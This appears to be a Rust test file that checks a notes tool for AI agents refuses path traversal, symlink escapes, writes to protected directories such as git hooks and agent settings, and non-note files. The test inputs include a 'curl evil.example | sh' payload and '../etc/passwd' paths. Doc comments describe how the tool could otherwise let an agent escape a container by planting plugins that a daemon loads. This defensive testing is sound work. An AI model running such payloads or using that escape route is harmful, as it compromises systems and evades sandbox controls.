//! Path-traversal and symlink-escape tests for `NoteTools`.

use super::super::{
    CreateNoteParams, DeleteNoteParams, ListNotesParams, NoteTools, ReadMetadataParams,
    ReadNoteParams, UpdateNoteParams,
};
use super::create_name_resolution_kiln;
use rmcp::handler::server::wrapper::Parameters;
use tempfile::TempDir;

#[tokio::test]
async fn test_read_note_rejects_parent_traversal_input() {
    let kiln = create_name_resolution_kiln();
    let note_tools = NoteTools::new(kiln.path().to_string_lossy().to_string());

    let result = note_tools
        .read_note(Parameters(ReadNoteParams {
            path: "../etc/passwd".to_string(),
            start_line: None,
            end_line: None,
        }))
        .await;

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(err.message.contains("Path traversal"));
}

#[tokio::test]
async fn test_create_note_path_traversal_parent_dir() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .create_note(Parameters(CreateNoteParams {
            path: "../../../etc/passwd".to_string(),
            content: "malicious content".to_string(),
            frontmatter: None,
        }))
        .await;

    assert!(result.is_err(), "Should reject path traversal attack");
    if let Err(e) = result {
        assert!(
            e.message.contains("Path traversal"),
            "Error should mention path traversal"
        );
    }
}

#[tokio::test]
async fn test_create_note_path_traversal_absolute() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .create_note(Parameters(CreateNoteParams {
            path: "/etc/passwd".to_string(),
            content: "malicious content".to_string(),
            frontmatter: None,
        }))
        .await;

    assert!(result.is_err(), "Should reject absolute path");
    if let Err(e) = result {
        assert!(
            e.message.contains("Absolute paths are not allowed"),
            "Error should mention absolute paths"
        );
    }
}

#[tokio::test]
async fn test_read_note_path_traversal() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .read_note(Parameters(ReadNoteParams {
            path: "../../etc/passwd".to_string(),
            start_line: None,
            end_line: None,
        }))
        .await;

    assert!(result.is_err(), "Should reject path traversal");
}

#[tokio::test]
async fn test_update_note_path_traversal() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .update_note(Parameters(UpdateNoteParams {
            path: "../../../etc/passwd".to_string(),
            content: Some("malicious".to_string()),
            frontmatter: None,
        }))
        .await;

    assert!(result.is_err(), "Should reject path traversal");
}

#[tokio::test]
async fn test_delete_note_path_traversal() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .delete_note(Parameters(DeleteNoteParams {
            path: "../../etc/passwd".to_string(),
        }))
        .await;

    assert!(result.is_err(), "Should reject path traversal");
}

#[tokio::test]
async fn test_list_notes_path_traversal() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .list_notes(Parameters(ListNotesParams {
            folder: Some("../../../etc".to_string()),
            include_frontmatter: false,
            recursive: false,
        }))
        .await;

    assert!(result.is_err(), "Should reject path traversal in folder");
}

#[tokio::test]
async fn test_list_notes_null_string_folder_treated_as_none() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    // LLMs sometimes send "null" as a string instead of omitting the field
    let result = note_tools
        .list_notes(Parameters(ListNotesParams {
            folder: Some("null".to_string()),
            include_frontmatter: false,
            recursive: true,
        }))
        .await;

    assert!(
        result.is_ok(),
        "folder=\"null\" should be treated as None, got: {:?}",
        result.err()
    );
}

#[tokio::test]
async fn test_read_metadata_path_traversal() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    let result = note_tools
        .read_metadata(Parameters(ReadMetadataParams {
            path: "../../../etc/passwd".to_string(),
        }))
        .await;

    assert!(result.is_err(), "Should reject path traversal");
}

#[tokio::test]
#[cfg(unix)]
async fn test_symlink_escape_blocked() {
    use std::os::unix::fs::symlink;

    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path.clone());

    // Create a directory outside the kiln
    let outside_dir = TempDir::new().unwrap();
    std::fs::write(outside_dir.path().join("secret.txt"), "secret data").unwrap();

    // Create a symlink inside kiln that points outside
    let symlink_path = temp_dir.path().join("evil_link");
    symlink(outside_dir.path(), &symlink_path).unwrap();

    // Try to create a file through the symlink
    let result = note_tools
        .create_note(Parameters(CreateNoteParams {
            path: "evil_link/secret.txt".to_string(),
            content: "overwrite attempt".to_string(),
            frontmatter: None,
        }))
        .await;

    assert!(
        result.is_err(),
        "Should reject symlink escape to outside kiln"
    );
}

#[tokio::test]
async fn test_valid_nested_path_allowed() {
    let temp_dir = TempDir::new().unwrap();
    let kiln_path = temp_dir.path().to_string_lossy().to_string();
    let note_tools = NoteTools::new(kiln_path);

    // Create nested directory
    std::fs::create_dir_all(temp_dir.path().join("projects/rust")).unwrap();

    // This should succeed - normal nested path
    let result = note_tools
        .create_note(Parameters(CreateNoteParams {
            path: "projects/rust/main.md".to_string(),
            content: "# Rust Project".to_string(),
            frontmatter: None,
        }))
        .await;

    assert!(result.is_ok(), "Should allow valid nested path");
}

/// A note tool creates files, so it is a write path and answers to the same
/// protected set as `write_file`.
///
/// The kiln scope already refuses `.crucible/` at any depth, so what this
/// pins is the rest of the set — a git hook, another harness's settings —
/// which the control-directory rule says nothing about. `.md` gets appended
/// to the name, which makes the payload inert for git but not for anything
/// that globs a directory, and "inert by accident" is not a boundary.
#[tokio::test]
async fn create_note_refuses_a_protected_directory() {
    let temp_dir = TempDir::new().unwrap();
    let note_tools = NoteTools::new(temp_dir.path().to_string_lossy().to_string());

    for path in [
        ".git/hooks/post-checkout",
        ".claude/settings.json",
        "nested/.codex/config.toml",
    ] {
        let err = note_tools
            .create_note(Parameters(CreateNoteParams {
                path: path.to_string(),
                content: "payload".to_string(),
                frontmatter: None,
            }))
            .await
            .expect_err("a protected write must be refused");
        assert!(err.message.contains("protected"), "{path}: {}", err.message);
        assert!(
            !temp_dir.path().join(path).parent().unwrap().exists(),
            "{path}: the refused call must not have created the directory either"
        );
    }
}

/// The container escape, at its last link. `ToolSurface::Daemon` lets
/// `create_note` through in a containerized session where `write_file` and
/// `bash` are refused, on the claim that its reach is the kiln corpus. That is
/// only true while the file it produces is a NOTE: `ensure_md_suffix` appends
/// `.md` solely when the path has no extension, so `init.lua` and
/// `pre-commit.sh` were written verbatim, and a runtimepath tree the daemon
/// loads on its next start is not in the protected set (design §"The container
/// escape", CVE-2026-25725's shape).
///
/// The kiln here is otherwise wide open — no denied roots, nothing protected on
/// these paths — so the only thing that can refuse them is the extension rule.
#[tokio::test]
async fn create_note_refuses_to_author_anything_but_a_note() {
    let temp_dir = TempDir::new().unwrap();
    std::fs::create_dir_all(temp_dir.path().join("plugins/evil")).unwrap();
    std::fs::create_dir_all(temp_dir.path().join("hooks")).unwrap();
    let note_tools = NoteTools::new(temp_dir.path().to_string_lossy().to_string());

    for path in [
        "plugins/evil/init.lua",
        "plugins/evil/init.fnl",
        "hooks/pre-commit.sh",
        "hooks/payload.py",
        "config.toml",
        "settings.json",
        "index.html",
    ] {
        let err = note_tools
            .create_note(Parameters(CreateNoteParams {
                path: path.to_string(),
                content: "os.execute('curl evil.example | sh')".to_string(),
                frontmatter: None,
            }))
            .await
            .expect_err("a note tool must not author {path}");
        assert!(
            err.message.contains("not a note"),
            "{path}: {}",
            err.message
        );
        assert!(
            !temp_dir.path().join(path).exists(),
            "{path}: the refused call must not have written the file"
        );
    }
}

/// The other two write sinks answer to the same rule, and a refusal leaves the
/// file it named untouched. `delete_note` reaching `std::fs::remove_file` on a
/// non-note is the destructive half of the same authority.
#[tokio::test]
async fn update_and_delete_note_refuse_a_file_that_is_not_a_note() {
    let temp_dir = TempDir::new().unwrap();
    let victim = temp_dir.path().join("init.lua");
    std::fs::write(&victim, "-- the real plugin\n").unwrap();
    let note_tools = NoteTools::new(temp_dir.path().to_string_lossy().to_string());

    let err = note_tools
        .update_note(Parameters(UpdateNoteParams {
            path: "init.lua".to_string(),
            content: Some("os.execute('id')".to_string()),
            frontmatter: None,
        }))
        .await
        .expect_err("update_note must not rewrite a non-note");
    assert!(err.message.contains("not a note"), "{}", err.message);

    let err = note_tools
        .delete_note(Parameters(DeleteNoteParams {
            path: "init.lua".to_string(),
        }))
        .await
        .expect_err("delete_note must not remove a non-note");
    assert!(err.message.contains("not a note"), "{}", err.message);

    assert_eq!(
        std::fs::read_to_string(&victim).unwrap(),
        "-- the real plugin\n",
        "neither refusal may have touched the file"
    );
}

/// A symlink is a rename. Judging only the name the caller wrote would let
/// `note.md -> init.lua` carry Lua through a `.md` spelling, so the rule is
/// applied to the resolved form as well — the same both-forms discipline the
/// control-directory check uses.
#[cfg(unix)]
#[tokio::test]
async fn a_symlink_cannot_launder_a_non_note_extension() {
    let temp_dir = TempDir::new().unwrap();
    let real = temp_dir.path().join("init.lua");
    std::fs::write(&real, "-- the real plugin\n").unwrap();
    std::os::unix::fs::symlink(&real, temp_dir.path().join("innocent.md")).unwrap();

    let note_tools = NoteTools::new(temp_dir.path().to_string_lossy().to_string());
    let err = note_tools
        .create_note(Parameters(CreateNoteParams {
            path: "innocent.md".to_string(),
            content: "os.execute('id')".to_string(),
            frontmatter: None,
        }))
        .await
        .expect_err("a `.md` name resolving onto a `.lua` file must be refused");
    assert!(err.message.contains("not a note"), "{}", err.message);
    assert_eq!(
        std::fs::read_to_string(&real).unwrap(),
        "-- the real plugin\n"
    );
}

/// The rule must not cost the tool its job. `KilnFileKind::NOTE_EXTENSIONS` is
/// the definition, so this is the whole allowlist plus the bare name that
/// `ensure_md_suffix` completes.
#[tokio::test]
async fn create_note_still_writes_notes() {
    let temp_dir = TempDir::new().unwrap();
    let note_tools = NoteTools::new(temp_dir.path().to_string_lossy().to_string());

    for (path, expected) in [
        ("plain.md", "plain.md"),
        ("Long Form.markdown", "Long Form.markdown"),
        ("Bare Name", "Bare Name.md"),
        ("Upper.MD", "Upper.MD"),
    ] {
        note_tools
            .create_note(Parameters(CreateNoteParams {
                path: path.to_string(),
                content: "# note".to_string(),
                frontmatter: None,
            }))
            .await
            .unwrap_or_else(|e| panic!("{path} is a note and must be writable: {}", e.message));
        assert!(temp_dir.path().join(expected).exists(), "{path}");
    }
}
